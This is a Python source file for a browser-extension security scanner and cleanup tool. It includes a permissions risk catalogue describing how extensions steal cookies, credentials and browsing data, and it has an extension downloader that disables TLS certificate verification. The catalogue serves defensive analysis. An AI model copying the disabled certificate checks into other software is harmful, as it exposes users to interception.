#!/usr/bin/env python3
"""
RemedeX — browser extension security, analysis & cleanup

Manage browser extensions and browser data: scan, list, remove, download extensions,
clean localStorage, cache, service workers, and cookies.
Can scan, list, remove, and DOWNLOAD any extension, plus clean localStorage, cache, 
service workers, and cookies.

Usage:
    CLI:  python remedex.py --list-extensions
          python remedex.py --remove-extension <id>
          python remedex.py --download-extension <id>
          python remedex.py --clean-all
    GUI:  python remedex.py --gui
"""

import os
import sys
import json
import shutil
import sqlite3
import argparse
import platform
import subprocess
import struct
import zipfile
import re
import urllib.parse
import time
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Set, Any
from dataclasses import dataclass, field

# Optional imports for downloading
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


# ============================================
# PERMISSIONS DICTIONARY
# ============================================

PERMISSIONS_DICTIONARY = {
    # High-risk permissions
    "<all_urls>": {
        "description": "Access to ALL websites you visit - can read and modify any webpage content.",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "Ad blockers that need to block ads on all sites",
            "Password managers that fill forms on any site",
            "Accessibility tools that modify page appearance globally"
        ],
        "malicious_uses": [
            "Stealing passwords, credit cards, and personal data from any site",
            "Injecting cryptocurrency miners or ads into all pages",
            "Tracking all browsing activity and exfiltrating data"
        ]
    },
    "*://*/*": {
        "description": "Wildcard access to all HTTP and HTTPS websites (equivalent to <all_urls>).",
        "risk_level": "HIGH",
        "legitimate_uses": ["Same as <all_urls>"],
        "malicious_uses": ["Same as <all_urls>"]
    },
    "http://*/*": {
        "description": "Access to ALL HTTP (non-secure) websites.",
        "risk_level": "HIGH",
        "legitimate_uses": ["Extensions that need to work on HTTP sites", "Security extensions that warn about HTTP"],
        "malicious_uses": ["Man-in-the-middle attacks on insecure pages", "Credential theft from non-HTTPS login pages"]
    },
    "https://*/*": {
        "description": "Access to ALL HTTPS (secure) websites.",
        "risk_level": "HIGH",
        "legitimate_uses": ["Extensions needing broad site access", "Developer tools"],
        "malicious_uses": ["Stealing data from banking, email, social media sites", "Session hijacking"]
    },
    "tabs": {
        "description": "Can see all open tabs including URLs, titles, and favicons. Can create, modify, and close tabs.",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "Tab managers and organizers",
            "Session savers that restore tabs",
            "Extensions that need to know current page URL"
        ],
        "malicious_uses": [
            "Tracking complete browsing history in real-time",
            "Detecting when you visit banking/email sites to activate attacks",
            "Fingerprinting and profiling user behavior"
        ]
    },
    "webRequest": {
        "description": "Can observe all network requests made by the browser (URLs, headers, etc.).",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "Ad blockers and privacy tools",
            "Security extensions that check URLs",
            "Developer debugging tools"
        ],
        "malicious_uses": [
            "Intercepting all API calls including authentication tokens",
            "Logging all URLs visited including sensitive parameters",
            "Exfiltrating form submissions before encryption"
        ]
    },
    "webRequestBlocking": {
        "description": "Can block and MODIFY network requests - change headers, redirect URLs, alter data.",
        "risk_level": "CRITICAL",
        "legitimate_uses": [
            "Ad blockers that block requests to ad servers",
            "Privacy tools that strip tracking parameters",
            "Security tools that block malicious URLs"
        ],
        "malicious_uses": [
            "Redirecting banking sites to phishing pages",
            "Injecting malicious scripts into page responses",
            "Stripping security headers to enable attacks (XSS, clickjacking)"
        ]
    },
    "declarativeNetRequest": {
        "description": "Can modify network requests using rules - block requests, modify headers.",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "Ad blockers (modern Manifest V3 approach)",
            "Privacy extensions removing tracking headers",
            "Content filtering"
        ],
        "malicious_uses": [
            "Removing security headers (CSP, X-Frame-Options) to enable XSS/clickjacking",
            "Redirecting requests to malicious servers",
            "Blocking security software update checks"
        ]
    },
    "cookies": {
        "description": "Can read, modify, and delete cookies for any website.",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "Cookie managers and editors",
            "Privacy tools that auto-delete tracking cookies",
            "Session management extensions"
        ],
        "malicious_uses": [
            "Stealing session cookies to hijack accounts",
            "Injecting tracking cookies",
            "Accessing authentication tokens stored in cookies"
        ]
    },
    "history": {
        "description": "Can read and delete your complete browsing history.",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "History search and management tools",
            "Privacy tools that auto-clear history",
            "Analytics for personal browsing insights"
        ],
        "malicious_uses": [
            "Exfiltrating complete browsing history for profiling",
            "Detecting visits to competitor sites",
            "Blackmail based on sensitive site visits"
        ]
    },
    "downloads": {
        "description": "Can initiate downloads, access download history, and open downloaded files.",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "Download managers",
            "Media downloaders (video, image)",
            "Batch download tools"
        ],
        "malicious_uses": [
            "Downloading malware without user consent",
            "Tracking what files user downloads",
            "Auto-executing malicious downloaded files"
        ]
    },
    "management": {
        "description": "Can manage other extensions - enable, disable, uninstall, get info.",
        "risk_level": "CRITICAL",
        "legitimate_uses": [
            "Extension managers",
            "Security tools that check for malicious extensions",
            "Developer tools for extension testing"
        ],
        "malicious_uses": [
            "Disabling security extensions (antivirus, ad blockers)",
            "Installing additional malicious extensions",
            "Hiding itself from extension lists"
        ]
    },
    "nativeMessaging": {
        "description": "Can communicate with programs installed on your computer outside the browser.",
        "risk_level": "CRITICAL",
        "legitimate_uses": [
            "Password managers syncing with desktop app",
            "Browser integration with native apps",
            "Hardware device communication (YubiKey, etc.)"
        ],
        "malicious_uses": [
            "Installing malware on the system",
            "Accessing files outside browser sandbox",
            "Keylogging and screen capture via native helper"
        ]
    },
    "debugger": {
        "description": "Full debugging access - can execute arbitrary JavaScript, modify any page.",
        "risk_level": "CRITICAL",
        "legitimate_uses": [
            "Developer debugging tools",
            "Automated testing extensions",
            "Performance profiling tools"
        ],
        "malicious_uses": [
            "Complete control over any webpage",
            "Intercepting and modifying all data",
            "Bypassing all security measures"
        ]
    },
    "proxy": {
        "description": "Can configure browser proxy settings - route traffic through arbitrary servers.",
        "risk_level": "CRITICAL",
        "legitimate_uses": [
            "VPN extensions",
            "Privacy/anonymity tools",
            "Corporate proxy configuration"
        ],
        "malicious_uses": [
            "Routing all traffic through attacker's server",
            "Man-in-the-middle attacks on all connections",
            "Logging and modifying all browsing data"
        ]
    },
    "clipboardRead": {
        "description": "Can read content from your clipboard.",
        "risk_level": "MEDIUM",
        "legitimate_uses": [
            "Clipboard managers",
            "Paste enhancement tools",
            "Note-taking extensions"
        ],
        "malicious_uses": [
            "Stealing copied passwords, credit cards, private keys",
            "Monitoring clipboard for cryptocurrency addresses to swap",
            "Exfiltrating copied sensitive text"
        ]
    },
    "clipboardWrite": {
        "description": "Can write/modify content in your clipboard.",
        "risk_level": "MEDIUM",
        "legitimate_uses": [
            "Copy formatting tools",
            "URL shorteners that copy result",
            "Code snippet tools"
        ],
        "malicious_uses": [
            "Replacing cryptocurrency addresses with attacker's address",
            "Injecting malicious commands when user pastes in terminal",
            "Modifying copied passwords"
        ]
    },
    "geolocation": {
        "description": "Can access your geographic location.",
        "risk_level": "MEDIUM",
        "legitimate_uses": [
            "Weather extensions",
            "Local search tools",
            "Location-based reminders"
        ],
        "malicious_uses": [
            "Tracking physical location",
            "Targeted attacks based on location",
            "Selling location data to advertisers"
        ]
    },
    "storage": {
        "description": "Can store data locally in the browser. Required by most extensions.",
        "risk_level": "LOW",
        "legitimate_uses": [
            "Saving extension settings and preferences",
            "Caching data for offline use",
            "Storing user configurations"
        ],
        "malicious_uses": [
            "Storing exfiltrated data before sending",
            "Maintaining persistence data",
            "Storing tracking identifiers"
        ]
    },
    "unlimitedStorage": {
        "description": "Can store unlimited data locally (normally limited to 5MB).",
        "risk_level": "LOW",
        "legitimate_uses": [
            "Offline-capable apps",
            "Media caching extensions",
            "Data backup tools"
        ],
        "malicious_uses": [
            "Storing large amounts of stolen data",
            "Local database for extensive tracking"
        ]
    },
    "activeTab": {
        "description": "Temporary access to the current tab only when user clicks extension icon.",
        "risk_level": "LOW",
        "legitimate_uses": [
            "Page analyzers that run on demand",
            "Screenshot tools",
            "Text selection tools"
        ],
        "malicious_uses": [
            "Limited risk - only activates on user click",
            "Could still steal data from current page when clicked"
        ]
    },
    "alarms": {
        "description": "Can schedule code to run at specific times or intervals.",
        "risk_level": "LOW",
        "legitimate_uses": [
            "Reminder extensions",
            "Periodic sync/backup tools",
            "Break reminder apps"
        ],
        "malicious_uses": [
            "Scheduling data exfiltration",
            "Periodic C2 check-ins",
            "Delayed payload execution"
        ]
    },
    "notifications": {
        "description": "Can show desktop notifications.",
        "risk_level": "LOW",
        "legitimate_uses": [
            "Email notifiers",
            "Social media alerts",
            "Reminder apps"
        ],
        "malicious_uses": [
            "Phishing via fake notifications",
            "Annoying/scam advertising",
            "Social engineering attacks"
        ]
    },
    "scripting": {
        "description": "Can inject and execute JavaScript in web pages (with appropriate host permissions).",
        "risk_level": "VARIES",
        "legitimate_uses": [
            "Content enhancement extensions",
            "Accessibility tools",
            "Page modification tools"
        ],
        "malicious_uses": [
            "Injecting keyloggers into pages",
            "Modifying page content (fake content injection)",
            "Stealing form data"
        ]
    },
    "bookmarks": {
        "description": "Can read and modify bookmarks.",
        "risk_level": "MEDIUM",
        "legitimate_uses": [
            "Bookmark managers and sync tools",
            "Bookmark search extensions",
            "Organization tools"
        ],
        "malicious_uses": [
            "Exfiltrating bookmarks to learn about user",
            "Replacing legitimate bookmarks with phishing sites",
            "Profiling user interests"
        ]
    },
    "topSites": {
        "description": "Can see your most frequently visited sites.",
        "risk_level": "MEDIUM",
        "legitimate_uses": [
            "New tab page replacements",
            "Quick access extensions",
            "Productivity dashboards"
        ],
        "malicious_uses": [
            "Profiling user behavior",
            "Identifying high-value targets (banking sites, etc.)",
            "Selling browsing habits"
        ]
    },
    "webNavigation": {
        "description": "Can track page navigation events (when pages load, redirect, etc.).",
        "risk_level": "MEDIUM",
        "legitimate_uses": [
            "Tab/session managers",
            "Security tools tracking redirects",
            "Developer tools"
        ],
        "malicious_uses": [
            "Tracking all page visits in real-time",
            "Detecting navigation to sensitive sites",
            "Building browsing profiles"
        ]
    },
    "identity": {
        "description": "Can get OAuth tokens and user identity info from Google accounts.",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "Google service integrations",
            "Cloud sync extensions",
            "Google Drive tools"
        ],
        "malicious_uses": [
            "Stealing OAuth tokens for account access",
            "Accessing Google services as the user",
            "Account takeover"
        ]
    },
    "privacy": {
        "description": "Can modify browser privacy settings.",
        "risk_level": "HIGH",
        "legitimate_uses": [
            "Privacy enhancement tools",
            "Fingerprinting protection",
            "Network privacy tools"
        ],
        "malicious_uses": [
            "Disabling privacy protections",
            "Enabling tracking",
            "Weakening browser security"
        ]
    },
    "contextMenus": {
        "description": "Can add items to right-click context menus.",
        "risk_level": "LOW",
        "legitimate_uses": [
            "Adding quick actions to right-click menu",
            "Search integration",
            "Text processing tools"
        ],
        "malicious_uses": [
            "Minimal direct risk",
            "Could add deceptive menu items"
        ]
    },
    "background": {
        "description": "Extension can run in the background even when popup is closed.",
        "risk_level": "MEDIUM",
        "legitimate_uses": [
            "Most extensions need this for functionality",
            "Continuous monitoring tools",
            "Sync services"
        ],
        "malicious_uses": [
            "Persistent data collection",
            "Continuous C2 communication",
            "Background cryptocurrency mining"
        ]
    }
}


# ============================================
# EXTENSION DOWNLOADER CLASSES
# ============================================

class ChromeWebStoreURLBuilder:
    """Constructs Chrome Web Store download URLs"""
    
    def __init__(self):
        self.platform_info = self._detect_platform_info()
        self.default_options = {
            'os': self.platform_info['os'],
            'arch': self.platform_info['arch'],
            'nacl_arch': self.platform_info['nacl_arch'],
            'prodversion': '9999.0.9999.0',
        }
    
    def _detect_platform_info(self) -> Dict[str, str]:
        """Detect platform information"""
        system = platform.system().lower()
        machine = platform.machine().lower()
        
        if system == 'darwin':
            os_name = 'mac'
        elif system == 'windows':
            os_name = 'win'
        else:
            os_name = 'linux'
        
        if 'arm' in machine:
            arch = 'arm'
        elif '64' in machine or 'amd64' in machine or 'x86_64' in machine:
            arch = 'x86-64'
        else:
            arch = 'x86-32'
        
        return {'os': os_name, 'arch': arch, 'nacl_arch': arch}
    
    def to_cws_url(self, extension_id: str) -> str:
        """Generate Chrome Web Store download URL"""
        if not re.match(r'^[a-p]{32}$', extension_id):
            raise ValueError(f"Invalid extension ID format: {extension_id}")
        
        url = 'https://clients2.google.com/service/update2/crx?response=redirect'
        url += f"&os={self.default_options['os']}"
        url += f"&arch={self.default_options['arch']}"
        url += f"&os_arch={self.default_options['arch']}"
        url += f"&nacl_arch={self.default_options['nacl_arch']}"
        url += '&prod=chromiumcrx'
        url += '&prodchannel=unknown'
        url += f"&prodversion={self.default_options['prodversion']}"
        url += '&acceptformat=crx2,crx3'
        url += f"&x=id%3D{extension_id}%26uc"
        
        return url
    
    def crx_to_zip(self, crx_data: bytes, output_filename: str) -> str:
        """Convert CRX file data to ZIP format"""
        # Check if already ZIP
        if len(crx_data) >= 4 and crx_data[:4] == b'PK\x03\x04':
            with open(output_filename, 'wb') as f:
                f.write(crx_data)
            return output_filename
        
        # Check CRX magic "Cr24"
        if len(crx_data) < 8 or crx_data[:4] != b'Cr24':
            zip_data = self._find_zip_in_data(crx_data)
            if zip_data:
                with open(output_filename, 'wb') as f:
                    f.write(zip_data)
                return output_filename
            raise ValueError("Invalid CRX file: Does not start with Cr24")
        
        version = crx_data[4]
        if version == 2:
            zip_start = self._parse_crx2_header(crx_data)
        elif version == 3:
            zip_start = self._parse_crx3_header(crx_data)
        else:
            raise ValueError(f"Unexpected CRX format version: {version}")
        
        zip_data = crx_data[zip_start:]
        
        # Handle nested CRX
        if version == 3 and len(zip_data) >= 4 and zip_data[:4] == b'Cr24':
            return self.crx_to_zip(zip_data, output_filename)
        
        with open(output_filename, 'wb') as f:
            f.write(zip_data)
        
        return output_filename
    
    def _parse_crx2_header(self, crx_data: bytes) -> int:
        """Parse CRX2 header and return ZIP start offset"""
        if len(crx_data) < 16:
            raise ValueError("CRX2 file too small")
        pubkey_length = struct.unpack('<I', crx_data[8:12])[0]
        sig_length = struct.unpack('<I', crx_data[12:16])[0]
        if pubkey_length > 10000 or sig_length > 10000:
            return self._find_zip_offset(crx_data)
        return 16 + pubkey_length + sig_length
    
    def _parse_crx3_header(self, crx_data: bytes) -> int:
        """Parse CRX3 header and return ZIP start offset"""
        if len(crx_data) < 12:
            raise ValueError("CRX3 file too small")
        header_length = struct.unpack('<I', crx_data[8:12])[0]
        if header_length > 10000:
            return self._find_zip_offset(crx_data)
        return 12 + header_length
    
    def _find_zip_in_data(self, data: bytes) -> Optional[bytes]:
        """Find ZIP signature within data"""
        for sig in [b'PK\x03\x04', b'PK\x05\x06', b'PK\x07\x08']:
            pos = data.find(sig)
            if pos != -1:
                return data[pos:]
        return None
    
    def _find_zip_offset(self, crx_data: bytes) -> int:
        """Find ZIP data offset by searching for ZIP signature"""
        zip_data = self._find_zip_in_data(crx_data)
        if zip_data:
            return len(crx_data) - len(zip_data)
        raise ValueError("No ZIP signature found in CRX file")
    
    @staticmethod
    def parse_webstore_url(url: str) -> str:
        """Extract extension ID from Chrome Web Store URL"""
        parsed = urllib.parse.urlparse(url)
        if 'chrome.google.com' in parsed.netloc:
            parts = parsed.path.split('/')
            for part in parts:
                if re.match(r'^[a-p]{32}$', part):
                    return part
        raise ValueError("Could not extract extension ID from URL")


class ExtensionDownloader:
    """Downloads Chrome extensions from the Web Store"""
    
    def __init__(self, output_dir: str = "./downloads", verbose: bool = True):
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library required for downloading. Install with: pip install requests")
        
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.verbose = verbose
        self.url_builder = ChromeWebStoreURLBuilder()
        self.session = requests.Session()
        self._setup_session()
    
    def _setup_session(self):
        """Setup HTTP session"""
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Referer": "https://chrome.google.com",
            "Accept": "application/octet-stream,application/x-chrome-extension,*/*",
        })
        self.session.verify = False
    
    def log(self, message: str):
        """Log if verbose"""
        if self.verbose:
            print(f"[Downloader] {message}")
    
    def validate_extension_id(self, extension_id: str) -> bool:
        """Validate Chrome extension ID format"""
        return bool(re.match(r'^[a-p]{32}$', extension_id))
    
    def download(self, extension_id: str, output_filename: Optional[str] = None,
                extract: bool = False, show_progress: bool = True) -> Dict[str, Any]:
        """
        Download a Chrome extension
        
        Args:
            extension_id: Chrome extension ID (32 chars)
            output_filename: Custom output filename
            extract: Whether to extract the ZIP after download
            show_progress: Show download progress
        
        Returns:
            Dict with download results
        """
        if not self.validate_extension_id(extension_id):
            raise ValueError(f"Invalid extension ID: {extension_id}")
        
        self.log(f"Downloading extension: {extension_id}")
        
        # Generate download URL
        download_url = self.url_builder.to_cws_url(extension_id)
        self.log(f"URL: {download_url}")
        
        # Download CRX
        crx_data = self._download_crx(download_url, show_progress)
        if not crx_data:
            raise ValueError("Failed to download extension (may not exist or be unavailable)")
        
        # Generate output filename
        if not output_filename:
            output_filename = f"{extension_id}.zip"
        if not output_filename.endswith('.zip'):
            output_filename += '.zip'
        
        output_path = self.output_dir / output_filename
        
        # Convert CRX to ZIP
        self.log("Converting CRX to ZIP...")
        zip_file = self.url_builder.crx_to_zip(crx_data, str(output_path))
        
        result = {
            "extension_id": extension_id,
            "zip_file": zip_file,
            "size": len(crx_data),
            "extracted_dir": None,
            "manifest": None,
        }
        
        # Extract if requested
        if extract:
            extract_dir = self.output_dir / extension_id
            self.log(f"Extracting to: {extract_dir}")
            
            with zipfile.ZipFile(zip_file, 'r') as zf:
                zf.extractall(extract_dir)
            
            result["extracted_dir"] = str(extract_dir)
            
            # Try to read manifest
            manifest_path = extract_dir / "manifest.json"
            if manifest_path.exists():
                try:
                    with open(manifest_path, 'r', encoding='utf-8') as f:
                        result["manifest"] = json.load(f)
                except:
                    pass
        
        self.log(f"Success! Downloaded to: {zip_file}")
        return result
    
    def _download_crx(self, url: str, show_progress: bool = True) -> Optional[bytes]:
        """Download CRX file from URL"""
        try:
            response = self.session.get(url, stream=True, timeout=60)
            
            if response.status_code == 204:
                self.log("Extension not available (HTTP 204)")
                return None
            elif response.status_code != 200:
                raise ValueError(f"HTTP Error {response.status_code}")
            
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' in content_type:
                self.log("Received HTML instead of CRX - extension may not exist")
                return None
            
            content_length = response.headers.get('content-length')
            file_size = int(content_length) if content_length else None
            
            downloaded = 0
            crx_data = b''
            
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    crx_data += chunk
                    downloaded += len(chunk)
                    
                    if show_progress and file_size:
                        progress = (downloaded / file_size) * 100
                        print(f"\rDownloading... {progress:.1f}% ({self._format_size(downloaded)}/{self._format_size(file_size)})", 
                              end='', flush=True)
            
            if show_progress:
                print()
            
            return crx_data
            
        except Exception as e:
            self.log(f"Download error: {e}")
            raise
    
    def download_multiple(self, extension_ids: List[str], extract: bool = False) -> Dict[str, Dict]:
        """Download multiple extensions"""
        results = {}
        for ext_id in extension_ids:
            try:
                result = self.download(ext_id, extract=extract, show_progress=False)
                results[ext_id] = result
                self.log(f"Downloaded: {ext_id}")
            except Exception as e:
                results[ext_id] = {"error": str(e)}
                self.log(f"Failed: {ext_id} - {e}")
        return results
    
    def get_extension_info(self, zip_file: str) -> Dict[str, Any]:
        """Extract info from a downloaded extension ZIP"""
        info = {"files": [], "manifest": None, "permissions": [], "host_permissions": []}
        
        try:
            with zipfile.ZipFile(zip_file, 'r') as zf:
                info["files"] = zf.namelist()
                
                if "manifest.json" in info["files"]:
                    with zf.open("manifest.json") as mf:
                        manifest = json.load(mf)
                        info["manifest"] = manifest
                        info["name"] = manifest.get("name", "Unknown")
                        info["version"] = manifest.get("version", "Unknown")
                        info["description"] = manifest.get("description", "")
                        info["permissions"] = manifest.get("permissions", [])
                        info["host_permissions"] = manifest.get("host_permissions", [])
        except Exception as e:
            info["error"] = str(e)
        
        return info
    
    @staticmethod
    def _format_size(size_bytes: int) -> str:
        """Format file size"""
        if size_bytes < 1024:
            return f"{size_bytes} B"
        elif size_bytes < 1024 * 1024:
            return f"{size_bytes / 1024:.1f} KB"
        else:
            return f"{size_bytes / (1024 * 1024):.1f} MB"


# ============================================
# EXTENSION DATA CLASSES
# ============================================

@dataclass
class Extension:
    """Represents a browser extension"""
    id: str
    name: str
    version: str
    description: str
    browser: str
    profile: str
    path: Path
    permissions: List[str] = field(default_factory=list)
    host_permissions: List[str] = field(default_factory=list)
    content_scripts: List[str] = field(default_factory=list)
    is_enabled: bool = True
    manifest_version: int = 2
    is_unpacked: bool = False  # True for locally loaded/development extensions
    heuristics: List[str] = field(default_factory=list)
    dnr_warnings: List[str] = field(default_factory=list)
    extracted_domains: Dict[str, List[str]] = field(default_factory=dict)
    trusted_label: str = ""
    risk_score: int = -1
    obfuscated_files: List[str] = field(default_factory=list)
    webstore_meta: Dict[str, Any] = field(default_factory=dict)
    csp_issues: List[str] = field(default_factory=list)
    csp_raw: str = ""
    sri_issues: List[Dict[str, str]] = field(default_factory=list)
    
    def has_heuristics(self) -> bool:
        return len(self.heuristics) > 0

    def has_dnr_warnings(self) -> bool:
        return len(self.dnr_warnings) > 0

    def has_csp_issues(self) -> bool:
        return len(self.csp_issues) > 0

    def has_sri_issues(self) -> bool:
        return len(self.sri_issues) > 0

    def has_wide_permissions(self) -> bool:
        """True if any API or host permission is rated medium or higher in the permissions model."""
        return self._permission_risk() in ("medium", "high", "critical")

    _RISK_PRIORITY = {"safe": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}

    def _permission_risk(self) -> str:
        """Get the raw max permission risk from PERMISSIONS_DICTIONARY lookups."""
        max_risk = "safe"
        for perm in self.permissions:
            info = PERMISSIONS_DICTIONARY.get(perm, {})
            level = info.get("risk_level", "").lower()
            if level == "varies":
                level = "medium"
            if self._RISK_PRIORITY.get(level, 0) > self._RISK_PRIORITY.get(max_risk, 0):
                max_risk = level

        wide_hosts = {"<all_urls>", "*://*/*", "http://*/*", "https://*/*"}
        for host in self.host_permissions:
            info = PERMISSIONS_DICTIONARY.get(host, None)
            if info:
                level = info.get("risk_level", "LOW").lower()
            elif host in wide_hosts:
                level = "high"
            elif "*" in host:
                level = "medium"
            else:
                level = "low"
            if self._RISK_PRIORITY.get(level, 0) > self._RISK_PRIORITY.get(max_risk, 0):
                max_risk = level
        return max_risk

    def calculate_risk_level(self) -> str:
        """Calculate the effective display risk derived from the numeric score.

        Uses the same thresholds everywhere so label, color, and score always match:
            CRITICAL  = score >= 76
            HIGH      = score >= 51
            MEDIUM    = score >= 26
            LOW       = score >= 1
            SAFE      = score == 0
        """
        if getattr(self, 'trusted_label', ""):
            return "trusted"

        score = self.risk_score if self.risk_score >= 0 else self.calculate_risk_score()
        if score >= 76:
            return "critical"
        if score >= 51:
            return "high"
        if score >= 26:
            return "medium"
        if score >= 1:
            return "low"
        return "safe"

    def calculate_risk_score(self) -> int:
        """Calculate a 0-100 risk score based on permissions, domains, heuristics, obfuscation."""
        if getattr(self, 'trusted_label', ""):
            self.risk_score = 0
            return 0

        score = 0
        perm_risk = self._permission_risk()
        if perm_risk == "critical":
            score += 35
        elif perm_risk == "high":
            score += 25
        elif perm_risk == "medium":
            score += 12
        elif perm_risk == "low":
            score += 5

        # Heuristic warnings
        score += min(30, len(self.heuristics) * 10)
        # DNR warnings
        score += min(30, len(self.dnr_warnings) * 15)
        # External domains
        dom_count = len(self.extracted_domains)
        if dom_count > 20:
            score += 20
        elif dom_count > 10:
            score += 10
        elif dom_count > 5:
            score += 5
        # Obfuscated files
        score += min(30, len(getattr(self, 'obfuscated_files', [])) * 10)
        # CSP issues
        score += min(15, len(getattr(self, 'csp_issues', [])) * 5)
        # SRI issues (+5 each, capped at 10)
        score += min(10, len(getattr(self, 'sri_issues', [])) * 5)

        self.risk_score = min(100, score)
        return self.risk_score


@dataclass
class BrowserProfile:
    """Represents a browser profile"""
    browser: str
    name: str
    path: Path


@dataclass
class CleanupResult:
    """Results from a cleanup operation"""
    success: bool
    action: str
    details: str
    items_removed: int = 0
    win_error: Optional[int] = None


def _winreg_policy_access_read():
    """Windows: KEY_WOW64_64KEY so policy paths match 64-bit Chromium."""
    import winreg
    return winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)


def _winreg_policy_access_write():
    import winreg
    return winreg.KEY_ALL_ACCESS | getattr(winreg, "KEY_WOW64_64KEY", 0)


def _extension_id_safe_for_ps(ext_id: str) -> bool:
    s = ext_id.strip().lower()
    return len(s) == 32 and re.match(r"^[a-p]{32}$", s) is not None


def _policy_access_denied(err: Optional[BaseException]) -> bool:
    if err is None:
        return False
    wn = getattr(err, "winerror", None)
    if wn == 5:
        return True
    return "denied" in str(err).lower()


def _dedupe_policy_tasks(tasks: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
    seen: Set[Tuple[str, str]] = set()
    out: List[Tuple[str, str]] = []
    for b, e in tasks:
        t = (str(b).lower().strip(), str(e).strip())
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out


def _dedupe_policy_tasks_with_names(
    tasks: List[Tuple[str, str, Optional[str]]],
) -> List[Tuple[str, str, Optional[str]]]:
    """Dedupe by (browser, ext_id); keep first non-empty display name."""
    seen: Set[Tuple[str, str]] = set()
    out: List[Tuple[str, str, Optional[str]]] = []
    for b, e, n in tasks:
        key = (str(b).lower().strip(), str(e).strip())
        if key not in seen:
            seen.add(key)
            out.append((key[0], key[1], n))
    return out


def _needs_windows_policy_elevation(res: CleanupResult) -> bool:
    if res.success:
        return False
    if res.win_error == 5:
        return True
    d = (res.details or "").lower()
    return "access is denied" in d or "winerror 5" in d


class BrowserExtensionManager:
    """Main class for browser extension management and cleanup"""
    
    def __init__(self, verbose: bool = True):
        self.verbose = verbose
        self.results: List[CleanupResult] = []
        self.system = platform.system()
        self.extensions_cache: List[Extension] = []
        # Survives rescans so Web Store metadata is not lost when the tree refreshes.
        self._webstore_meta_by_id: Dict[str, Dict[str, Any]] = {}
        
    def log(self, message: str):
        """Log message if verbose mode"""
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {message}")

    def _discover_home_dirs(self) -> List[tuple]:
        """Discover all user home directories on the system.
        Returns list of (username, home_path) tuples.
        """
        homes = []
        seen = set()

        def _add(username: str, home: Path):
            try:
                real = home.resolve()
            except OSError:
                return
            if real not in seen:
                seen.add(real)
                homes.append((username, home))

        try:
            if self.system == "Windows":
                users_dir = Path(os.environ.get("SystemDrive", "C:") + "\\") / "Users"
                skip = {"default", "default user", "public", "all users"}
                if users_dir.exists():
                    for d in users_dir.iterdir():
                        if d.is_dir() and d.name.lower() not in skip and (d / "AppData" / "Local").exists():
                            _add(d.name, d)
            elif self.system == "Darwin":
                users_dir = Path("/Users")
                if users_dir.exists():
                    for d in users_dir.iterdir():
                        if d.is_dir() and d.name != "Shared" and (d / "Library").exists():
                            _add(d.name, d)
            elif self.system == "Linux":
                home_dir = Path("/home")
                if home_dir.exists():
                    for d in home_dir.iterdir():
                        if d.is_dir():
                            _add(d.name, d)
        except PermissionError:
            pass

        current_home = Path.home()
        _add(current_home.name, current_home)
        return homes

    def _get_username_from_path(self, browser_path: Path) -> str:
        """Extract OS username from a browser data path."""
        parts = browser_path.parts
        try:
            if self.system == "Windows":
                idx = [p.lower() for p in parts].index("users")
                return parts[idx + 1]
            elif self.system == "Darwin":
                idx = parts.index("Users")
                return parts[idx + 1]
            elif self.system == "Linux":
                idx = parts.index("home")
                return parts[idx + 1]
        except (ValueError, IndexError):
            pass
        return ""

    def get_browser_paths(self) -> Dict[str, List[Path]]:
        """Get browser data paths for all users on the current OS"""
        paths = {"chrome": [], "edge": [], "brave": []}
        home_dirs = self._discover_home_dirs()
        self._multi_user = len(home_dirs) > 1

        for _username, home in home_dirs:
            if self.system == "Windows":
                local_app_data = home / "AppData" / "Local"
                app_data = home / "AppData" / "Roaming"

                candidates = {
                    "chrome": local_app_data / "Google" / "Chrome" / "User Data",
                    "edge":   local_app_data / "Microsoft" / "Edge" / "User Data",
                    "brave":  local_app_data / "BraveSoftware" / "Brave-Browser" / "User Data",
                }
            elif self.system == "Darwin":
                app_support = home / "Library" / "Application Support"
                candidates = {
                    "chrome":  app_support / "Google" / "Chrome",
                    "edge":    app_support / "Microsoft Edge",
                    "brave":   app_support / "BraveSoftware" / "Brave-Browser",
                }
            elif self.system == "Linux":
                candidates = {
                    "chrome":  home / ".config" / "google-chrome",
                    "edge":    home / ".config" / "microsoft-edge",
                    "brave":   home / ".config" / "BraveSoftware" / "Brave-Browser",
                }
            else:
                candidates = {}

            for browser, p in candidates.items():
                try:
                    if p.exists():
                        paths[browser].append(p)
                except PermissionError:
                    pass

        return {k: v for k, v in paths.items()}
    
    def get_profiles(self, browser_path: Path, browser: str) -> List[BrowserProfile]:
        """Get all profiles for a browser"""
        profiles = []
        multi = getattr(self, '_multi_user', False)
        prefix = ""
        if multi:
            username = self._get_username_from_path(browser_path)
            if username:
                prefix = f"{username}/"
        
        try:
            default_path = browser_path / "Default"
            if default_path.exists():
                profiles.append(BrowserProfile(browser, f"{prefix}Default", default_path))

            for item in browser_path.iterdir():
                if item.is_dir() and item.name.startswith("Profile "):
                    profiles.append(BrowserProfile(browser, f"{prefix}{item.name}", item))
        except PermissionError:
            self.log(f"Permission denied reading {browser_path}")
        
        return profiles
    
    BROWSER_PROCESS_NAMES = {
        "chrome": ["chrome.exe", "chrome", "Google Chrome"],
        "edge": ["msedge.exe", "msedge", "Microsoft Edge"],
        "brave": ["brave.exe", "brave", "Brave Browser"],
    }
